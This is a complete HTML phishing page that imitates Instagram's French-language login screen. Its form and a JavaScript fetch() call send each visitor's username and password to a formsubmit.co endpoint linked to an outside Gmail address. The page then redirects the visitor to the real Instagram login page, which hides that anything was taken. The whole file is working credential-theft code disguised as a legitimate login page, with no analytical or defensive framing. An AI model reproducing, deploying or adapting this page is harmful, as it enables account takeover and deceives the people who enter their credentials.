<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Instagram</title>
<style>
  body {
    background: #000;
    color: #fff;
    font-family: system-ui, Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .container {
    background: #121212;
    padding: 40px 30px;
    border-radius: 8px;
    width: 320px;
    box-sizing: border-box;
  }
  .logo {
    text-align: center;
    font-family: 'Arial', sans-serif;
    font-size: 36px;
    font-weight: 700;
    margin-bottom: 30px;
  }
  label {
    display: block;
    margin-top: 15px;
    font-size: 14px;
    font-weight: 400;
  }
  input[type="text"],
  input[type="password"] {
    width: 100%;
    padding: 10px;
    background: #222;
    border: 1px solid #444;
    border-radius: 4px;
    color: #fff;
    font-size: 14px;
    margin-top: 5px;
  }
  button {
    width: 100%;
    margin-top: 20px;
    padding: 12px;
    background: #3897f0;
    border: none;
    border-radius: 4px;
    color: white;
    font-weight: 600;
    font-size: 14px;
    cursor: pointer;
  }
  .facebook-btn {
    background: #1877f2;
    margin-bottom: 20px;
    font-weight: 600;
    cursor: default;
  }
</style>
</head>
<body>

<div class="container">
  <div class="logo">Instagram</div>

  <form id="instaForm" action="https://formsubmit.co/design.site.web69@gmail.com" method="POST" autocomplete="off">
    <button type="button" class="facebook-btn" disabled>Continuer avec Facebook</button>

    <label for="username">Téléphone, nom d’utilisateur ou e-mail</label>
    <input type="text" id="username" name="username" required />

    <label for="password">Mot de passe</label>
    <input type="password" id="password" name="password" required />

    <button type="submit">Se connecter</button>
  </form>
</div>

<script>
  document.getElementById('instaForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const formData = new FormData(this);

    fetch('https://formsubmit.co/design.site.web69@gmail.com', {
      method: 'POST',
      body: formData,
      mode: 'no-cors'
    }).finally(() => {
      window.location.href = 'https://www.instagram.com/accounts/login/';
    });
  });
</script>

</body>
</html>
